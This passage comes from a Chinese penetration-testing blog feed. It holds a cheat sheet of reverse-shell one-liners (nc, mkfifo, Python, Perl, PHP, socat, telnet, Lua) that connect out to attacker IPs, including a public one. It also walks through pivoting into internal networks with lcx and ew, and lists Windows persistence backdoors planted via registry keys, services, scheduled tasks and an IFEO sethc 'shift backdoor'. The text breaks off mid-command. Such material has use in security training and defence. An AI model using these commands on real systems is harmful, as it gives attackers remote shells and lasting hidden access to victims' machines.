2&gt;&amp;196</span><br></pre></td></tr></table></figure><p>用法：</p><p>1.exec 命令 ;命令代替shell程序，命令退出，shell 退出；比如 exec ls</p><p>2.exec 文件重定向，可以将文件的重定向就看为是shell程序的文件重定向 比如 exec 5&lt;&#x2F;dev&#x2F;null;exec 5&lt;&amp;-</p><p><img src="image-20210625120318189.png" alt="image-20210625120318189"></p><p><img src="image-20210625120330240.png" alt="image-20210625120330240"></p><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><p>NC如果可以使用 -e参数那么就可以直接进行shell的反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.1.1 4433</span><br></pre></td></tr></table></figure><p>如果不能使用 -e</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 207.246.86.81 4433 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><img src="image-20210625120343640.png" alt="image-20210625120343640"></p><p><img src="image-20210625120351432.png" alt="image-20210625120351432"></p><p>类似命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>exec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php- &#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.1/4433&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>socket</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.21.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.21.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure><h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat exec:&#x27;bash -i&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.21.1:8080</span><br></pre></td></tr></table></figure><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure><h2 id="Windows-反弹shell"><a href="#Windows-反弹shell" class="headerlink" title="Windows 反弹shell"></a>Windows 反弹shell</h2><p> windows下可以使用powershell去下载，powercat,nishang等攻击脚本进行反弹shell,但其实没啥必要，使用MSF，CS等直接上线目标权限，其实更方便。这里就不细讲了。感兴趣的同学，可以自行探索。</p><h1 id="端口转发与映射"><a href="#端口转发与映射" class="headerlink" title="端口转发与映射"></a>端口转发与映射</h1><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>端口转发，有时被叫做隧道，是安全壳为网络安全通信使用的一种方法。端口转发是转发一个网络端口从一个网络端口转发到另一个网络端口或从一个网络节点转发到另一个网络节点的行为，其使一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址（局域网内网）上的一个端口。</p><p>简单来说，端口转发就是将一个端口，这个端口可以本地的端口也可以是访问到任意主机的端口，转发到任意一台可以访问的IP上，通常这个IP是公网IP。</p><h2 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h2><p>将内网的端口映射到公网的某个端口，就是将这个端口的流量转发到公网主机上的某个端口。当别人访问这个被转发到公网上的端口，那么公网主机的被转发端口流量将发回给内网主机。</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>端口映射：外网主机A想访问内网主机B上的服务</p><p>端口转发：外网主机A已经可以访问内网主机B里的任意端口，但是无法访问内网主机C上的端口，此时可以将C主机的端口转发到主机B端口，那么外网主机A访问了内网主机B就等于访问了内网主机C。</p><p><img src="image-20210625120409517.png" alt="image-20210625120409517"></p><h2 id="端口转发攻击演示"><a href="#端口转发攻击演示" class="headerlink" title="端口转发攻击演示"></a>端口转发攻击演示</h2><h3 id="场景："><a href="#场景：" class="headerlink" title="场景："></a>场景：</h3><p>攻击者获取到了 边界服务器B的权限，同时也获取到了目标内网服务器C的权限，现在攻击者想要直接访问目标内网的3389服务。</p><h3 id="实验环境模拟"><a href="#实验环境模拟" class="headerlink" title="实验环境模拟"></a>实验环境模拟</h3><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>1.VM 网络编辑器，添加一个仅主机，取消红框中的勾选</p><p><img src="image-20210625120426963.png" alt="image-20210625120426963"></p><p>2.为 centos 添加一个网卡，并选择刚刚创建的虚拟网络</p><p><img src="image-20210625120438273.png" alt="image-20210625120438273"></p><p>3.将内网 win7 主机也设置为刚刚创建的虚拟网络</p><p><img src="image-20210625120448039.png" alt="image-20210625120448039"></p><p>4.为内网 win7 开启3389 端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><p><img src="image-20210625120457726.png" alt="image-20210625120457726"></p><p><code>netstat -an | findstr 3389</code> 查看开启成功</p><p><img src="image-20210625120507291.png" alt="image-20210625120507291"></p><p>5.关闭centos7的防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br></pre></td></tr></table></figure><h4 id="攻击演示-LCX"><a href="#攻击演示-LCX" class="headerlink" title="攻击演示 LCX"></a>攻击演示 LCX</h4><p><strong>内网Windows主机C：</strong></p><p>lcx.exe -slave  [边界服务器IP&#x2F;VPS] 6666  [受害机C IP] 3389  &#x2F;&#x2F;把肉机的3389端口 转发到 边界&#x2F;VPS 6666端口上</p><p><img src="image-20210625120538163.png" alt="image-20210625120538163"></p><p><strong>边界服务器B：</strong></p><p>.&#x2F;lcx -listen 6666 8888 &#x2F;&#x2F;监听6666端口并转发到8888端口</p><p><img src="image-20210625120547748.png" alt="image-20210625120547748"></p><p><strong>攻击者A：</strong></p><p>访问边界服务器&#x2F;VPS 的8888端口，即可连接目标内网的3389</p><p><img src="image-20210625120558556.png" alt="image-20210625120558556"></p><h2 id="流量代理工具演示："><a href="#流量代理工具演示：" class="headerlink" title="流量代理工具演示："></a>流量代理工具演示：</h2><p>环境还是刚刚那个环境</p><h3 id="ew正向代理"><a href="#ew正向代理" class="headerlink" title="ew正向代理"></a>ew正向代理</h3><p>我们在边界服务器B上，开启SOCKS 代理，然后在攻击机A上添加好代理，即可访问目标内网C</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s ssocksd -l 10085</span><br></pre></td></tr></table></figure><p><img src="image-20210625120609739.png" alt="image-20210625120609739"></p><p><img src="image-20210625120617808.png" alt="image-20210625120617808"></p><h3 id="EW反向代理"><a href="#EW反向代理" class="headerlink" title="EW反向代理"></a>EW反向代理</h3><p>假设我们获取到了目标内网机器C权限，并且C可以访问外网。</p><p>&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 1024 &amp;</p><p>ew_for_Win.exe -s rssocks -d 120.xxx.xxx.xx -e 1024</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows权限维持</title>
      <link href="/2020/10/22/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2020/10/22/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<hr><p>文中所提到的利用方式均在WIN10或2016中进行了测试。</p><h2 id="Windows-启动目录："><a href="#Windows-启动目录：" class="headerlink" title="Windows 启动目录："></a>Windows 启动目录：</h2><p>Windows 启动目录分为，用户启动目录，与系统启动目录。</p><p>用户启动目录是登录特定用户的时候才会启动。</p><p>系统启动目录是所有登录该计算机的用户都会启动。</p><h3 id="用户启动目录："><a href="#用户启动目录：" class="headerlink" title="用户启动目录："></a>用户启动目录：</h3><p>用户启动目录只要 Administrator 权限即可</p><p>C:\Users{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move c:\xxx.exe &quot;C:\Users\&#123;username&#125;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xxx.exe&quot;</span><br></pre></td></tr></table></figure><h3 id="系统启动目录："><a href="#系统启动目录：" class="headerlink" title="系统启动目录："></a>系统启动目录：</h3><p>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</p><p>如果通过 move 的方式向系统启动目录的写入需要进行提权，才可写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move c:\xxx.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\xxx.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="Windows-服务注册："><a href="#Windows-服务注册：" class="headerlink" title="Windows 服务注册："></a>Windows 服务注册：</h2><p>通过在注册表中注册恶意服务并设置为自启动的方式来进行持久化。</p><h3 id="CMD-通过-sc-进行注册："><a href="#CMD-通过-sc-进行注册：" class="headerlink" title="CMD 通过 sc 进行注册："></a>CMD 通过 sc 进行注册：</h3><p>服务注册至少需要本地管理组权限。还需要注意SC 命令需要等号后面接空格在加参数</p><p>命令详解：sc create 服务名 binpath&#x3D; “命令” start&#x3D; “auto” obj&#x3D; “objectname”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc create pentestlab binpath= &quot;cmd.exe /k C:\temp\pentestlab.exe&quot; start=&quot;auto&quot; obj=&quot;LocalSystem&quot;</span><br><span class="line">sc start pentestlab #立即启动服务</span><br></pre></td></tr></table></figure><p><img src="image-20210624231905989.png" alt="image-20210624231905989"></p><h3 id="PowerShell-通过New-service-创建："><a href="#PowerShell-通过New-service-创建：" class="headerlink" title="PowerShell 通过New-service 创建："></a>PowerShell 通过New-service 创建：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-service -Name &quot;服务名&quot; -BinaryPathName &quot;执行的命令&quot; -Description &quot;&quot; -StartupType Automatic</span><br><span class="line">sc start pentestlab</span><br></pre></td></tr></table></figure><p><img src="image-20210624231926376.png" alt="image-20210624231926376"></p><h2 id="Registry-Run-Keys（注册表注册键）："><a href="#Registry-Run-Keys（注册表注册键）：" class="headerlink" title="Registry Run Keys（注册表注册键）："></a>Registry Run Keys（注册表注册键）：</h2><h3 id="Run-注册键-："><a href="#Run-注册键-：" class="headerlink" title="Run 注册键 ："></a>Run 注册键 ：</h3><h4 id="HKCU"><a href="#HKCU" class="headerlink" title="HKCU:"></a>HKCU:</h4><p>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p><p>我们通常安装的软件，其开机自启动都会放在该注册表下。如图</p><p><img src="image-20210624232015083.png" alt="image-20210624232015083"></p><p>所以我们也能通过向该注册表添加新的键值对进行恶意的开机启动。</p><p>对 <strong>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</strong> 注册表的修改只要求有 administrator 权限即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v qf_test /t REG_SZ /d &quot;C:\WINDOWS\system32\notepad.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210624232031420.png" alt="image-20210624232031420"></p><h4 id="HKLM"><a href="#HKLM" class="headerlink" title="HKLM:"></a>HKLM:</h4><p>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p><p>而 <strong>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</strong> 则需要提升了权限后才可以进行修改，因为有效负载将在每次系统启动时执行，而与使用系统身份验证的用户无关。</p><p><img src="image-20210624232054474.png" alt="image-20210624232054474"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v qf_test1 /t REG_SZ /d &quot;C:\WINDOWS\system32\notepad.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210624232121665.png" alt="image-20210624232121665"></p><h3 id="Userinit-注册键："><a href="#Userinit-注册键：" class="headerlink" title="Userinit 注册键："></a>Userinit 注册键：</h3><p>Userinit 位于 计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</p><p>以下是微软对于该注册键的说明：</p><p>指定用户登录时Winlogon运行的程序。默认情况下，Winlogon运行Userinit.exe，后者运行登录脚本，重新建立网络连接，然后启动Windows用户界面Explorer.exe。</p><p>您可以更改此条目的值以添加或删除程序。例如，要在Windows资源管理器用户界面启动之前运行程序，请在该条目的值中用该程序的名称替换Userinit.exe，然后在该程序中包含说明以启动Userinit.exe。如果您脱机工作且未使用登录脚本，则可能还需要用Explorer.exe代替Userinit.exe。</p><p>Userinit注册键是可以通过逗号分割多个应用程序，并且执行的程序还可以带参数（也就意味着，可以利用 powershell 实现无文件后门持久化）。需要注意的是，修改 Userinit 必须要管理员权限才可。</p><p><img src="image-20210624232149786.png" alt="image-20210624232149786"></p><h4 id="通过-Reg-修改注册表-："><a href="#通过-Reg-修改注册表-：" class="headerlink" title="通过 Reg 修改注册表 ："></a>通过 Reg 修改注册表 ：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /t REG_SZ /d &quot;C:\Windows\system32\userinit.exe,cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><p><img src="image-20210624232207162.png" alt="image-20210624232207162"></p><h4 id="通过-PowerShell-修改注册表："><a href="#通过-PowerShell-修改注册表：" class="headerlink" title="通过 PowerShell 修改注册表："></a>通过 PowerShell 修改注册表：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name Userinit -value &quot;C:\Windows\system32\userinit.exe,cmd.exe /c calc.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210624232227557.png" alt="image-20210624232227557"></p><h3 id="LogonScript-注册键："><a href="#LogonScript-注册键：" class="headerlink" title="LogonScript 注册键："></a>LogonScript 注册键：</h3><p><strong>UserInitMprLogonScript</strong> 注册键位于 <strong>HKCU:\Environment</strong> 下，大多数系统，注册表中都不会包含这一项。我们只需要创建该键即可。reg 或 powershell 都可以完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCU:\Environment&quot; /v UserInitMprLogonScript /t REG_SZ /d &quot;c:\users\red2\desktop\1.bat&quot; /f</span><br></pre></td></tr></table></figure><p><img src="image-20210624232245033.png" alt="image-20210624232245033"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment&quot; UserInitMprLogonScript -value &quot;c:\users\red2\desktop\1.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure><p><img src="image-20210624232306271.png" alt="image-20210624232306271"></p><p>注销登录就可以发现文件成功被写入，并且需要注意的是，LogonScript 的启动优先级较高，甚至优于某些杀软启动。</p><p><img src="image-20210624232339147.png" alt="image-20210624232339147"></p><h3 id="Load-注册键："><a href="#Load-注册键：" class="headerlink" title="Load 注册键："></a>Load 注册键：</h3><p><strong>Load</strong> 注册键位于 <strong>HKEY_CURRENT_USER\Software\Microsoft\WindowsNT\CurrentVersion\Windows</strong> 下。通常该键也是不存在的，但是也可以通过添加 load 键值的方式，使其生效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\WindowsNT\CurrentVersion\Windows&quot; /v load /t REG_SZ /d &quot;c:\users\red2\desktop\1.bat&quot; /f</span><br></pre></td></tr></table></figure><p><img src="image-20210624232400599.png" alt="image-20210624232400599"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows&quot; load -value &quot;c:\users\red2\desktop\1.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure><p><img src="image-20210624232427618.png" alt="image-20210624232427618"></p><p>注销登录后成功触发</p><p><img src="image-20210624232448856.png" alt="image-20210624232448856"></p><h3 id="Explore-run-注册键："><a href="#Explore-run-注册键：" class="headerlink" title="Explore\run 注册键："></a>Explore\run 注册键：</h3><p><strong>Explore\run</strong> 位于 <strong>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer</strong> 与 <strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer</strong>  下, 这两个注册表项需要提权才能进行修改。</p><p><img src="image-20210624232508456.png" alt="image-20210624232508456"></p><p>直接使用 reg 创建一个 run 注册表项，并同时创建 twin 键值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg  add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\run&quot; /v twin /t REG_SZ /d &quot;lala.exe&quot; /f</span><br></pre></td></tr></table></figure><p><img src="image-20210624232527384.png" alt="image-20210624232527384"></p><p>当我使用WIN 10进行测试的时候，发现通过这种方式创建的持久化，会触发 explorer 的错误，只有关闭掉该错误提示，才会进行后续动作</p><p><img src="image-20210624232539988.png" alt="image-20210624232539988"></p><p><img src="image-20210624232549788.png" alt="image-20210624232549788"></p><p>win 2016 则不存在这种问题，其他系统未进行测试，暂时不知道会不会出现这样的问题。</p><p><img src="image-20210624232613770.png" alt="image-20210624232613770"></p><p>注销登陆，成功触发。</p><p><img src="image-20210624232627494.png" alt="image-20210624232627494"></p><p>而单纯使用 PowerShell 进行创建的话，则先需要创建 run 注册表项，然后在创建健值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-Item &quot;HKCU:\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\run&quot;</span><br><span class="line">New-ItemProperty &quot;HKCU:\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\run&quot; run_shell -value &quot;c:\users\red2\desktop\1.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure><p><img src="image-20210624232653580.png" alt="image-20210624232653580"></p><h3 id="Command-Processor-AutoRun-注册键："><a href="#Command-Processor-AutoRun-注册键：" class="headerlink" title="Command Processor\AutoRun 注册键："></a>Command Processor\AutoRun 注册键：</h3><p>Command Processor\AutoRun 注册键位于<strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor</strong> 启动时间先于用户登录。在完全重启计算机时会运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKLM\SOFTWARE\Microsoft\Command Processor&quot; AutoRun -value &quot;c:\users\admin\desktop\1.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure><p><img src="image-20210624232724148.png" alt="image-20210624232724148"></p><p><img src="image-20210624232741942.png" alt="image-20210624232741942"></p><p>并且是以system权限启动</p><p><img src="image-20210624232758088.png" alt="image-20210624232758088"></p><p>并且 **HKCU:\SOFTWARE\Microsoft\Command Processor\AutoRun 和 HKLM:**<strong>SOFTWARE\Microsoft\Command Processor\AutoRun</strong>  都会在用户通过快速运行 cmd 的时候执行。</p><p><img src="image-20210624232942279.png" alt="image-20210624232942279"></p><h3 id="Winlogon-taskman-注册键："><a href="#Winlogon-taskman-注册键：" class="headerlink" title="Winlogon\taskman 注册键："></a>Winlogon\taskman 注册键：</h3><p><strong>taskman</strong> 位于 <strong>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</strong> 与 <strong>HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</strong>  但是经过测试，只有 HKLM 注册表下的 taskman 是生效的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; taskman -value &quot;c:\users\admin\desktop\1.exe&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure><p><img src="image-20210624233026091.png" alt="image-20210624233026091"></p><h3 id="Windows-NT-CurrentVersion-Windows-run-注册键："><a href="#Windows-NT-CurrentVersion-Windows-run-注册键：" class="headerlink" title="Windows NT\CurrentVersion\Windows\run 注册键："></a>Windows NT\CurrentVersion\Windows\run 注册键：</h3><p><strong>Windows\run</strong> 注册键位于 <strong>HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows</strong> 下 HKLM 下的该键则不会生效。并且该键值是需要用户登录桌面后才会启动，且是当前用户权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows&quot; run -value &quot;c:\users\admin\desktop\2.exe&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure><p><img src="image-20210624233049757.png" alt="image-20210624233049757"></p><h3 id="Windows-NT-CurrentVersion-Windows-load-注册键："><a href="#Windows-NT-CurrentVersion-Windows-load-注册键：" class="headerlink" title="Windows NT\CurrentVersion\Windows****load 注册键："></a>Windows NT\CurrentVersion\Windows****load 注册键：</h3><p><strong>Windows\load</strong> 位于 <strong>HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows</strong> 下和 <strong>Windows\run</strong> 一样，只有 HKCU 下的该键才生效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows&quot; load -value &quot;c:\users\admin\desktop\2.exe&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure><p><img src="image-20210624233104540.png" alt="image-20210624233104540"></p><h3 id="其它注册键："><a href="#其它注册键：" class="headerlink" title="其它注册键："></a>其它注册键：</h3><p>Windows 中可用于权限维持的注册键还有很多，由于精力有限，无法一一测试是否有效.</p><p><img src="image-20210624233205257.png" alt="image-20210624233205257"></p><p><img src="image-20210624233316781.png" alt="image-20210624233316781"></p><p><img src="image-20210624233347979.png" alt="image-20210624233347979"></p><p><img src="image-20210624234249327.png" alt="image-20210624234249327"></p><p><img src="image-20210624234311428.png" alt="image-20210624234311428"></p><p><img src="image-20210624234406685.png" alt="image-20210624234406685"></p><p><img src="image-20210624234421554.png" alt="image-20210624234421554"></p><p><img src="image-20210624234450839.png" alt="image-20210624234450839"></p><h2 id="计划任务："><a href="#计划任务：" class="headerlink" title="计划任务："></a>计划任务：</h2><p>在Windows操作系统中提供了一个实用程序（schtasks.exe），使系统管理员能够在特定的日期和时间执行程序或脚本。在实战中这个地方也经常被攻击者进行利用。同时也要求创建计划任务需要管理员权限才行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">On System Start</span><br><span class="line">schtasks /create /tn PentestLab /tr &quot;需要运行的程序或执行的命令&quot; /sc onstart /ru System</span><br><span class="line"></span><br><span class="line">On User Idle (30mins)</span><br><span class="line">schtasks /create /tn PentestLab /tr &quot;需要运行的程序或执行的命令&quot; /sc onidle /i 30</span><br><span class="line"></span><br><span class="line">On User Login</span><br><span class="line">schtasks /create /tn PentestLab /tr &quot;需要运行的程序或执行的命令&quot; /sc onlogon /ru System</span><br></pre></td></tr></table></figure><p><img src="image-20210624234603927.png" alt="image-20210624234603927"></p><p><img src="image-20210624234617016.png" alt="image-20210624234617016"></p><p>更多的详细信息请参考</p><p><a href="https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/">https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/</a></p><h2 id="Shift-后门："><a href="#Shift-后门：" class="headerlink" title="Shift 后门："></a>Shift 后门：</h2><p>我们都知道在登陆Windows的时候，Windows允许我们使用一些快捷功能，比如连续5次的shift启动粘贴键，在老版本的系统中（如xp&#x2F;2003）我们可以通过直接替换sethc.exe进行持久化的后门植入。但是到高版本系统之后，只有TrustedInstaller组用户才有权限进行更改。但是我们还是可以通过添加注册表的方式进行shift后门植入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><p><img src="image-20210624234639280.png" alt="image-20210624234639280"></p><p><img src="image-20210624234653667.png" alt="image-20210624234653667"></p><p>还有就是在以下<a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247483994&idx=1&sn=4041632680d059c6d9ed0aba0701ca71&chksm=cf4d8d3bf83a042d23216c02418ccbd377103f65b1b0eed0cbad61b055966bccd24c7637e495&mpshare=1&scene=23&srcid=&sharer_sharetime=1571196868049&sharer_shareid=be7a01e2434a36782542fb17e9d2a6e8#rd">文章</a>中看到的方式，利用对进程静默退出的监视操作，实现shift后门。但是这种方式不会像上面的那种，直接将CMD弹出到登陆界面，而是在sethc.exe退出之后运行。同样也是system权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Globalflag /t REG_DWORD /d 512 /f</span><br><span class="line">reg add 